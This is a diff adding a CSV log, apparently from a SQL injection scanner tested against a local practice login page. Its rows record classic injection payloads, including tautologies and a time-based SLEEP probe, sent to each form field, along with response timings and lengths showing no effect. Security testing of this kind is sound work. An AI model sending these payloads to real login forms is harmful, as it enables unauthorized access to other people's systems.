@@ -1,0 +1,25 @@
+page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
+http://localhost:8080/login.php,username,POST,' OR '1'='1,200,0.006622,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,' OR '1'='1,200,0.006788,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,' OR '1'='1,200,0.00517,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,' OR '1'='1,200,0.008508,1573,,1573,0.009894
+http://localhost:8080/login.php,username,POST,' OR '1'='1' -- ,200,0.016615,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,' OR '1'='1' -- ,200,0.008231,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,' OR '1'='1' -- ,200,0.007452,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,' OR '1'='1' -- ,200,0.007399,1573,,1573,0.009894
+http://localhost:8080/login.php,username,POST,' OR 1=1--,200,0.005597,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,' OR 1=1--,200,0.007366,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,' OR 1=1--,200,0.005748,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,' OR 1=1--,200,0.005519,1573,,1573,0.009894
+http://localhost:8080/login.php,username,POST,""" OR """" = """,200,0.012622,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,""" OR """" = """,200,0.006128,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,""" OR """" = """,200,0.005775,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,""" OR """" = """,200,0.003291,1573,,1573,0.009894
+http://localhost:8080/login.php,username,POST,' OR SLEEP(5) --,200,0.006223,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,' OR SLEEP(5) --,200,0.003797,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,' OR SLEEP(5) --,200,0.004237,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,' OR SLEEP(5) --,200,0.00335,1573,,1573,0.009894
+http://localhost:8080/login.php,username,POST,1' OR '1'='1,200,0.004368,1573,,1573,0.009894
+http://localhost:8080/login.php,password,POST,1' OR '1'='1,200,0.004419,1573,,1573,0.009894
+http://localhost:8080/login.php,Login,POST,1' OR '1'='1,200,0.003816,1573,,1573,0.009894
+http://localhost:8080/login.php,user_token,POST,1' OR '1'='1,200,0.005606,1573,,1573,0.009894
